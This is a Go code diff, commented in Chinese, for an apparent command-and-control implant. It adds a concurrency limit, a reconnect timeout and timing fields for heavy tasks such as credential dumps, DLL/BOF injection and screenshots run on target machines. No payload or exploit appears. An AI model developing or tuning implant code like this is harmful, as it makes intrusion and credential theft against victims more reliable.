@@ -201,6 +201,12 @@ type Result struct {
 	ExitCode int32
 	Output   string
 	Error    string
+	// DurationMS 本次任务执行耗时（毫秒）。重活任务"是不是慢"看这个，
+	// 服务端不解析也没关系：诊断信息随结果帧一起回传，抓包/日志可见。
+	DurationMS int64 `json:"duration_ms,omitempty"`
+	// QueuedMS 重活任务在并发闸前排队等待的时长（毫秒）：>0 说明触发了并发上限，
+	// 任务确实排队了（而不是被静默丢弃或无限堆积）。
+	QueuedMS int64 `json:"queued_ms,omitempty"`
 }
 
 // Heartbeat 心跳负载的本地镜像。
@@ -509,7 +515,12 @@ func run() {
 		stopWriteLoop()
 		// 等待重活任务排空：大文件下载/注入等异步任务可能仍在执行，
 		// 需等其结果帧写出后再关连接，避免结果丢失（服务端会因超时重新下发）。
-		heavyWg.Wait()
+		//
+		// 但**必须带超时**：旧实现是无上限的 heavyWg.Wait()，一个 180s 的凭据 dump
+		// 会把重连堵住整整三分钟（用户反馈的"卡死"场景之一）。超时后放弃等待：
+		// 后台 goroutine 继续跑完（结果因连接世代不匹配被丢弃，服务端按超时收尾），
+		// 重连不再被拖住。
+		_ = waitHeavyTasks(heavyWaitTimeout)
 		resetPool() // 清理残留隧道，避免重连后旧隧道 goroutine 挂住失效连接
 		if taskCh != nil {
 			close(taskCh) // 停止接受新任务，worker 排空当前任务后退出
@@ -978,7 +989,7 @@ func processData(data []byte) {
 		case taskCh <- task:
 		default:
 			// 队列满载（极端情况）回退同步执行，保证任务不丢失
-			executeAndSendResult(task, connGen.Load())
+			executeAndSendResult(task, connGen.Load(), 0)
 		}
 
 	case TypeShellOpen:
@@ -1026,7 +1037,7 @@ func taskWorker(gen uint64) {
 	for task := range taskCh {
 		if isHeavyTask(task.TaskType) {
 			// 重活任务：立即调度到独立 goroutine，不阻塞后续任务消费。
-			// 用 WaitGroup 跟踪，连接换代时由 run() 的 defer 等待排空。
+			// 用 WaitGroup 跟踪，连接换代时由 run() 的 defer 带超时等待排空。
 			heavyWg.Add(1)
 			go func(t Task) {
 				defer heavyWg.Done()
@@ -1035,16 +1046,66 @@ func taskWorker(gen uint64) {
 						// 重活任务 panic 兜底：不回结果（服务端按超时处理），绝不终止进程
 					}
 				}()
-				executeAndSendResult(t, gen)
+				// 并发闸：重活任务最多同时跑 heavyMaxConcurrent 个。**在 goroutine 里**
+				// 申请槽位（不是 worker 里），因此排队的是重活任务本身 —— 轻任务
+				// （whoami/echo/进程列表）仍然立刻被 worker 执行，不会被凭据/注入拖住。
+				queued := acquireHeavySlot()
+				defer releaseHeavySlot()
+				executeAndSendResult(t, gen, queued.Milliseconds())
 			}(task)
 			continue
 		}
-		executeAndSendResult(task, gen)
+		executeAndSendResult(task, gen, 0)
 	}
 }
 
-// heavyWg 跟踪进行中的重活任务，run() 返回前等待排空。
+// heavyWg 跟踪进行中的重活任务，run() 返回前带超时等待排空。
 var heavyWg sync.WaitGroup
+
+const (
+	// heavyMaxConcurrent 重活任务的最大并发数（默认 2）。
+	//
+	// 为什么要有这道闸：凭据 dump / BOF / 注入 / 截图这类重活会同时吃 CPU、磁盘
+	// 与网络。连续点几次凭据收集就会起 N 个 goroutine，把 CPU 和结果回传通道
+	// 一起打满 —— 表现为"凭据获取卡死其他任务"。限制为 2 后多余的排队
+	// （排队时长写进结果的 queued_ms，可观测），轻任务通道不受影响。
+	heavyMaxConcurrent = 2
+	// heavyWaitTimeout 连接结束时等待重活任务排空的上限。
+	// 超时即放弃等待（不阻塞重连）；后台 goroutine 仍会执行完，只是结果因连接
+	// 世代不匹配被丢弃，服务端按超时收尾。
+	heavyWaitTimeout = 5 * time.Second
+)
+
+// heavySem 重活任务信号量（容量 heavyMaxConcurrent）。
+var heavySem = make(chan struct{}, heavyMaxConcurrent)
+
+// acquireHeavySlot 申请一个重活槽位，返回排队等待的时长（0 = 立即拿到）。
+func acquireHeavySlot() time.Duration {
+	start := time.Now()
+	heavySem <- struct{}{}
+	return time.Since(start)
+}
+
+// releaseHeavySlot 释放一个重活槽位。
+func releaseHeavySlot() { <-heavySem }
+
+// waitHeavyTasks 带超时等待所有重活任务结束：true=已排空，false=超时（后台可能仍在执行）。
+//
+// 用一个额外的 goroutine 包住 WaitGroup.Wait：WaitGroup 本身不可取消，
+// 这是标准做法（超时后那个 goroutine 会随最后一个任务完成自然退出）。
+func waitHeavyTasks(timeout time.Duration) bool {
+	done := make(chan struct{})
+	go func() {
+		heavyWg.Wait()
+		close(done)
+	}()
+	select {
+	case <-done:
+		return true
+	case <-time.After(timeout):
+		return false
+	}
+}
 
 // isHeavyTask 判断任务是否为耗时重活（需要异步执行避免堵塞其他任务）。
 // 大文件下载（>2MB 走分块直传循环）、上传、截图、BOF/DLL 加载、注入、
@@ -1068,9 +1129,11 @@ func isHeavyTask(taskType string) bool {
 
 // executeAndSendResult 执行单个任务并同步回传结果帧；"exit" 任务发送后退出进程。
 // 会话热迁移：先查结果缓存（重连补发的已执行任务直接回放，不重复执行）。
+// queuedMS 为重活任务在并发闸前排队等待的毫秒数（轻任务恒为 0），随结果帧回传，
+// 让"排队了多久"可观测。
 // 注意：大文件传输类任务（file_download/file_upload）不缓存结果——
 // 其成功与否依赖分块是否完整送达，断连即失效；必须由服务端 resume 任务重新执行。
-func executeAndSendResult(task Task, gen uint64) {
+func executeAndSendResult(task Task, gen uint64, queuedMS int64) {
 	// 结果缓存去重：同一 task ID 已执行过 → 直接回放缓存结果（仅非大文件传输类）
 	if !isTransferTask(task.TaskType) {
 		resultCacheMu.Lock()
@@ -1086,6 +1149,7 @@ func executeAndSendResult(task Task, gen uint64) {
 	}
 
 	result := executeTaskWithTimeout(task)
+	result.QueuedMS = queuedMS
 
 	// 连接已换代（run 返回重连中）：旧任务结果作废，服务端会重新下发
 	if connGen.Load() != gen {
@@ -1114,15 +1178,24 @@ func executeAndSendResult(task Task, gen uint64) {
 // 最多运行 execTimeout，超时返回超时结果，绝不无限占住植入端 worker，
 // 否则后续任务会一直排队成 sent（植入端看似在线却不执行任务）。
 // 用 goroutine + select 实现超时（executeTask 是同步阻塞，无法 context 取消）。
+//
+// 结果里带 duration_ms：超时/失败/成功都能看出"这次到底跑了多久"，
+// 便于判断"是慢还是卡"。超时文案明确写"已放弃等待，后台可能仍在执行"——
+// 超时只代表我们不等了，goroutine 无法取消，任务可能仍在目标机上跑。
 func executeTaskWithTimeout(task Task) Result {
 	ch := make(chan Result, 1)
+	started := time.Now()
 	go func() {
+		elapsed := func() int64 { return time.Since(started).Milliseconds() }
 		defer func() {
 			if r := recover(); r != nil {
-				ch <- Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: -1, Error: "task panic: " + fmt.Sprint(r)}
+				ch <- Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: -1,
+					Error: "task panic: " + fmt.Sprint(r), DurationMS: elapsed()}
 			}
 		}()
-		ch <- executeTask(task)
+		res := executeTask(task)
+		res.DurationMS = elapsed()
+		ch <- res
 	}()
 
 	timeout := execTimeout
@@ -1134,7 +1207,10 @@ func executeTaskWithTimeout(task Task) Result {
 		return res
 	case <-time.After(timeout):
 		return Result{TaskID: task.ID, TaskType: task.TaskType, ExitCode: -1,
-			Error: "task timed out after " + timeout.String(), Output: ""}
+			DurationMS: time.Since(started).Milliseconds(),
+			Error: "task timed out after " + timeout.String() +
+				"（已放弃等待，后台可能仍在执行：超时只代表不再等结果，任务仍可能在目标机上运行）",
+			Output: ""}
 	}
 }
 
